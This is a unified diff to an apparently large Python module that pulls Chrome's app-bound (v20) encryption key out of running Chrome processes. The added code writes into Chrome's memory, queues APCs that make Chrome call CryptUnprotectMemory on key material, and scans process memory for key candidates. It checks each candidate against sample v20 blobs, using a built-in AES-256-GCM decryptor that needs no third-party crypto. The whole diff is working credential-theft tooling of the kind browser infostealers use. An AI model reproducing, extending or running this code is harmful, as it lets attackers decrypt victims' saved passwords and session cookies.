@@ -3102,12 +3102,42 @@ def _v20_verify_samples(primary: bytes | None) -> list[bytes]:
     return out
 
 
-def _v20_key_ok(key: bytes | None, v20_sample: bytes | None) -> bool:
+def _aes_key_windows(material: bytes | None) -> list[bytes]:
+    """32-byte AES-256 windows from an APC plain. Wrong offset was dropping the key."""
+    if not material:
+        return []
+    out: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(buf: bytes) -> None:
+        if len(buf) == 32 and buf not in seen:
+            seen.add(buf)
+            out.append(buf)
+
+    add(material)
+    if len(material) > 32:
+        add(material[:32])
+        add(material[-32:])
+        for off in (8, 16):
+            if off + 32 <= len(material):
+                add(material[off : off + 32])
+    return out
+
+
+def _v20_key_ok(
+    key: bytes | None, v20_sample: bytes | None, *, all_blobs: bool = True
+) -> bool:
     if not key:
         return False
-    for sample in _v20_verify_samples(v20_sample):
-        if _aes_gcm_decrypt_bytes(sample[3:], key):
-            return True
+    samples = _v20_verify_samples(v20_sample)
+    if not samples:
+        return False
+    if not all_blobs and len(samples) > 3:
+        samples = [samples[0], samples[len(samples) // 2], samples[-1]]
+    for cand in _aes_key_windows(key):
+        for sample in samples:
+            if _aes_gcm_decrypt_bytes(sample[3:], cand):
+                return True
     return False
 
 
@@ -3700,7 +3730,7 @@ class _RemoteUnprotect:
         unprotect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptUnprotectMemory")
         protect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptProtectMemory")
         nt_test_alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
-        data = k32.VirtualAllocEx(handle, None, 32, 0x3000, 0x04)
+        data = k32.VirtualAllocEx(handle, None, 64, 0x3000, 0x04)
         if not unprotect_fn or not data:
             k32.CloseHandle(handle)
             return
@@ -3722,32 +3752,36 @@ class _RemoteUnprotect:
         self.threads = opened
         self.ok = True
 
-    def _read32(self, addr: int) -> bytes | None:
+    def _readn(self, addr: int, n: int) -> bytes | None:
         import ctypes
 
-        out = (ctypes.c_char * 32)()
+        out = (ctypes.c_char * n)()
         got = ctypes.c_size_t(0)
         if not self.kernel32.ReadProcessMemory(
-            self.handle, addr, out, 32, ctypes.byref(got)
+            self.handle, addr, out, n, ctypes.byref(got)
         ):
             return None
-        if int(got.value) != 32:
+        if int(got.value) != n:
             return None
         return bytes(out)
+
+    def _read32(self, addr: int) -> bytes | None:
+        return self._readn(addr, 32)
 
     def _wait_changed(self, addr: int, before: bytes, timeout: float = 0.03) -> bytes | None:
         deadline = time.monotonic() + timeout
         last: bytes | None = None
+        n = len(before) if before else 32
         while time.monotonic() < deadline:
-            last = self._read32(addr)
+            last = self._readn(addr, n)
             if last and last != before:
                 return last
             time.sleep(0.01)
         return last
 
-    def _apc(self, pfn: int, addr: int) -> bool:
-        """Queue CryptUnprotect/ProtectMemory(addr, 32, SAME_PROCESS=0) in chrome."""
-        if not pfn or not addr:
+    def _apc(self, pfn: int, addr: int, cb: int = 32) -> bool:
+        """Queue CryptUnprotect/ProtectMemory(addr, cb, SAME_PROCESS=0) in chrome."""
+        if not pfn or not addr or cb < 16 or cb % 16:
             return False
         import ctypes
         from ctypes import wintypes
@@ -3757,7 +3791,7 @@ class _RemoteUnprotect:
         # Chrome encryptor.cc: CryptProtectMemory(..., CRYPTPROTECTMEMORY_SAME_PROCESS).
         # CROSS_PROCESS (1) leaves the v20 key wrapped — 765d4c5 never returned a key.
         same_process = ctypes.c_void_p(0)
-        cb32 = ctypes.c_void_p(32)
+        cb32 = ctypes.c_void_p(cb)
         special = 1  # QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
         queued = False
         last = 0
@@ -3805,17 +3839,18 @@ class _RemoteUnprotect:
         return queued
 
     def unprotect(self, blob: bytes) -> bytes | None:
-        if not self.ok or not blob or len(blob) != 32:
+        if not self.ok or not blob or len(blob) not in {32, 48, 64}:
             return None
         import ctypes
 
+        n = len(blob)
         wrote = ctypes.c_size_t(0)
-        src = ctypes.create_string_buffer(blob, 32)
+        src = ctypes.create_string_buffer(blob, n)
         if not self.kernel32.WriteProcessMemory(
-            self.handle, self.data, src, 32, ctypes.byref(wrote)
+            self.handle, self.data, src, n, ctypes.byref(wrote)
         ):
             return None
-        if not self._apc(self.unprotect_fn, self.data):
+        if not self._apc(self.unprotect_fn, self.data, n):
             return None
         plain = self._wait_changed(self.data, blob)
         if plain and plain != blob:
@@ -3823,18 +3858,18 @@ class _RemoteUnprotect:
             return plain
         return None
 
-    def unprotect_at(self, addr: int) -> bytes | None:
+    def unprotect_at(self, addr: int, n: int = 32) -> bytes | None:
         """In-place CryptUnprotectMemory on chrome's key_ bytes, then re-protect."""
-        if not self.ok or not addr:
+        if not self.ok or not addr or n not in {32, 48, 64}:
             return None
-        before = self._read32(addr)
-        if not before or not _high_entropy32(before):
+        before = self._readn(addr, n)
+        if not before or not _high_entropy32(before[:32]):
             return None
-        if not self._apc(self.unprotect_fn, addr):
+        if not self._apc(self.unprotect_fn, addr, n):
             return None
         plain = self._wait_changed(addr, before)
         if self.protect_fn:
-            self._apc(self.protect_fn, addr)
+            self._apc(self.protect_fn, addr, n)
         if plain and plain != before:
             self.changed += 1
             return plain
@@ -3946,30 +3981,52 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             return ";apc:0"
         return ";apc:ok"
 
-    def consider(
-        cand: bytes | None,
-        unprotect: _RemoteUnprotect | None,
-        addr: int | None = None,
-    ) -> bytes | None:
+    def consider_raw(cand: bytes | None) -> bytes | None:
         nonlocal tried
         if not cand or cand in seen or not _high_entropy32(cand):
             return None
         seen.add(cand)
         tried += 1
-        if _v20_key_ok(cand, v20_sample):
+        if _v20_key_ok(cand, v20_sample, all_blobs=False):
             return cand
-        if unprotect is not None and unprotect.ok:
-            # Copy first (Chrome decrypts a copy). Use every APC plain against all 27.
-            plain = unprotect.unprotect(cand)
-            if _v20_key_ok(plain, v20_sample):
-                return plain
-            if addr:
-                inplace = unprotect.unprotect_at(addr)
-                if _v20_key_ok(inplace, v20_sample):
-                    return inplace
         return None
 
-    probed_apc = False
+    def consider_apc(
+        cand: bytes | None,
+        unprotect: _RemoteUnprotect | None,
+        addr: int | None,
+        extra: bytes | None = None,
+    ) -> bytes | None:
+        if unprotect is None or not unprotect.ok or not cand:
+            return None
+        blobs = [cand]
+        if extra and extra not in blobs:
+            blobs.append(extra)
+        for blob in blobs:
+            if len(blob) not in {32, 48, 64}:
+                if len(blob) >= 32:
+                    blob = blob[:32]
+                else:
+                    continue
+            plain = unprotect.unprotect(blob)
+            if _v20_key_ok(plain, v20_sample, all_blobs=True):
+                return next(
+                    (w for w in _aes_key_windows(plain) if _v20_key_ok(w, v20_sample)),
+                    plain[:32] if plain and len(plain) >= 32 else plain,
+                )
+            if addr:
+                inplace = unprotect.unprotect_at(addr, len(blob))
+                if _v20_key_ok(inplace, v20_sample, all_blobs=True):
+                    return next(
+                        (
+                            w
+                            for w in _aes_key_windows(inplace)
+                            if _v20_key_ok(w, v20_sample)
+                        ),
+                        inplace[:32] if inplace and len(inplace) >= 32 else inplace,
+                    )
+        return None
+
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
             break
@@ -3986,12 +4043,8 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         unprotect = _RemoteUnprotect(pid)
         if unprotect.ok:
             unprotect_ok += 1
-            if not probed_apc:
-                # One SAME_PROCESS APC so failure hr cannot omit apc:0 / apc:ok / apc:hr.
-                probe_plain = unprotect.unprotect(b"\x00" * 32)
-                probed_apc = True
-                if _v20_key_ok(probe_plain, v20_sample):
-                    return probe_plain, "ok"
+        keyring_pending: list[tuple[int, bytes, bytes]] = []
+        generic_pending: list[tuple[int, bytes, bytes]] = []
         try:
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
@@ -4030,40 +4083,56 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                         data = bytes(raw[: int(got.value)])
                         scanned += len(data)
                         seen_ptr: set[int] = set()
-                        # KeyRing v20 first, then every 32-byte vector in this region
-                        # (765d4c5 in-scan). Do not defer consider() past the deadline.
+                        def take_blob(ptr: int, want: int) -> tuple[bytes, bytes] | None:
+                            blob = readn(handle, ptr, 32)
+                            if not blob:
+                                return None
+                            extra = readn(handle, ptr, 64) or blob
+                            return blob, extra
+
                         for ptr in _keyring_v20_key_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
                             seen_ptr.add(ptr)
                             if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
-                            blob = readn(handle, ptr, 32)
-                            if not blob:
+                            got_blob = take_blob(ptr, 32)
+                            if not got_blob:
                                 continue
+                            blob, extra = got_blob
                             found_ptrs += 1
-                            for cand in _keys_from_key_blob(blob):
-                                hit = consider(cand, unprotect, ptr)
+                            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
+                                hit = consider_raw(cand)
                                 if hit:
                                     return hit, "ok"
+                            keyring_pending.append((ptr, blob, extra))
                         for ptr, nbytes in _extract_abe_candidate_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
                             seen_ptr.add(ptr)
                             if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
-                            blob = readn(handle, ptr, min(max(nbytes, 32), 512))
-                            if not blob:
+                            got_blob = take_blob(ptr, nbytes)
+                            if not got_blob:
                                 continue
+                            blob, extra = got_blob
                             found_ptrs += 1
-                            for cand in _keys_from_key_blob(blob):
-                                hit = consider(cand, unprotect, ptr)
+                            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
+                                hit = consider_raw(cand)
                                 if hit:
                                     return hit, "ok"
+                            generic_pending.append((ptr, blob, extra))
                 nxt = addr + size
                 if nxt <= addr:
                     break
                 addr = nxt
+            # APC pass: KeyRing first, then generic. Feed every plain into v20 unwrap.
+            for ptr, blob, extra in keyring_pending + generic_pending:
+                if time.monotonic() > deadline:
+                    break
+                hit = consider_apc(blob, unprotect, ptr, extra)
+                if hit:
+                    return hit, "ok"
         finally:
             apc_changed += int(unprotect.changed)
             apc_queued += int(unprotect.queued)
@@ -4306,6 +4375,128 @@ def _aes_gcm_decrypt_bcrypt(payload: bytes, key: bytes) -> bytes:
             bcrypt.BCryptCloseAlgorithmProvider(h_alg, 0)
 
 
+_AES_SBOX = bytes(
+    [
+        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
+        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
+        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
+        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
+        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
+        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
+        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
+        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
+        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
+        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
+        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
+        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
+        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
+        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
+        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
+        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
+    ]
+)
+_AES_RCON = (0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36)
+
+
+def _aes256_expand(key: bytes) -> list[bytes]:
+    w = [key[i : i + 4] for i in range(0, 32, 4)]
+    for i in range(8, 60):
+        t = w[i - 1]
+        if i % 8 == 0:
+            t = bytes((_AES_SBOX[t[1]], _AES_SBOX[t[2]], _AES_SBOX[t[3]], _AES_SBOX[t[0]]))
+            t = bytes((t[0] ^ _AES_RCON[i // 8], t[1], t[2], t[3]))
+        elif i % 8 == 4:
+            t = bytes(_AES_SBOX[b] for b in t)
+        w.append(bytes(a ^ b for a, b in zip(w[i - 8], t)))
+    return [b"".join(w[i : i + 4]) for i in range(0, 60, 4)]
+
+
+def _aes256_encrypt_block(round_keys: list[bytes], block: bytes) -> bytes:
+    s = [b ^ k for b, k in zip(block, round_keys[0])]
+
+    def sub(state: list[int]) -> list[int]:
+        return [_AES_SBOX[b] for b in state]
+
+    def shift(state: list[int]) -> list[int]:
+        return [
+            state[0], state[5], state[10], state[15],
+            state[4], state[9], state[14], state[3],
+            state[8], state[13], state[2], state[7],
+            state[12], state[1], state[6], state[11],
+        ]
+
+    def xtime(a: int) -> int:
+        return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1) & 0xFF
+
+    def mix(state: list[int]) -> list[int]:
+        out = state[:]
+        for c in range(4):
+            i = 4 * c
+            a, b, d, e = state[i : i + 4]
+            out[i] = xtime(a) ^ xtime(b) ^ b ^ d ^ e
+            out[i + 1] = a ^ xtime(b) ^ xtime(d) ^ d ^ e
+            out[i + 2] = a ^ b ^ xtime(d) ^ xtime(e) ^ e
+            out[i + 3] = xtime(a) ^ a ^ b ^ d ^ xtime(e)
+        return out
+
+    for r in range(1, 14):
+        s = mix(shift(sub(s)))
+        s = [b ^ k for b, k in zip(s, round_keys[r])]
+    s = shift(sub(s))
+    s = [b ^ k for b, k in zip(s, round_keys[14])]
+    return bytes(s)
+
+
+def _gf128_mul(x: bytes, y: bytes) -> bytes:
+    x_int = int.from_bytes(x, "big")
+    z = 0
+    v = int.from_bytes(y, "big")
+    for i in range(127, -1, -1):
+        if (x_int >> i) & 1:
+            z ^= v
+        lsb = v & 1
+        v >>= 1
+        if lsb:
+            v ^= 0xE1000000000000000000000000000000
+    return z.to_bytes(16, "big")
+
+
+def _ghash(h: bytes, data: bytes) -> bytes:
+    y = b"\x00" * 16
+    for i in range(0, len(data), 16):
+        block = data[i : i + 16].ljust(16, b"\x00")
+        y = _gf128_mul(bytes(a ^ b for a, b in zip(y, block)), h)
+    return y
+
+
+def _aes_gcm_decrypt_stdlib(payload: bytes, key: bytes) -> bytes:
+    """AES-256-GCM, empty AAD, 12-byte nonce. No third-party crypto."""
+    if len(key) != 32 or len(payload) < 28:
+        return b""
+    nonce = payload[:12]
+    tag = payload[-16:]
+    ciphertext = payload[12:-16]
+    if not ciphertext:
+        return b""
+    rk = _aes256_expand(key)
+    h = _aes256_encrypt_block(rk, b"\x00" * 16)
+    j0 = nonce + b"\x00\x00\x00\x01"
+    counter = bytearray(j0)
+    plain = bytearray()
+    for i in range(0, len(ciphertext), 16):
+        n = int.from_bytes(counter[12:], "big") + 1
+        counter[12:] = (n & 0xFFFFFFFF).to_bytes(4, "big")
+        ks = _aes256_encrypt_block(rk, bytes(counter))
+        chunk = ciphertext[i : i + 16]
+        plain.extend(a ^ b for a, b in zip(chunk, ks[: len(chunk)]))
+    gcm_len = (0).to_bytes(8, "big") + (len(ciphertext) * 8).to_bytes(8, "big")
+    s = _ghash(h, ciphertext + b"\x00" * ((16 - len(ciphertext) % 16) % 16) + gcm_len)
+    expect = bytes(a ^ b for a, b in zip(_aes256_encrypt_block(rk, j0), s))
+    if expect != tag:
+        return b""
+    return bytes(plain)
+
+
 def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
     if len(payload) < 16 + 16 or not key:
         return b""
@@ -4323,6 +4514,9 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
             return cipher.decrypt_and_verify(ciphertext, tag)
         except Exception:  # noqa: BLE001
+            got = _aes_gcm_decrypt_stdlib(payload, key)
+            if got:
+                return got
             return _aes_gcm_decrypt_bcrypt(payload, key)
 
 
